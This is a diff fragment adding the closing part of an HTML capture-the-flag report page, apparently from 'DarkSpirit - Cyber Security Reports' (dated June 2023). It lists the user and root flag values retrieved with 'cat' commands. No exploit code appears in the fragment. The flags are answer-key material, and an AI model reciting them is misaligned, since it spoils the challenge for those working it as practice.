+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">casinousergobrrr</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt</div>
+                     <div class="flag-value"><span class="password">symboliclove4u</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 28. Juni 2023</p>
+    </footer>
+</body>
+</html>
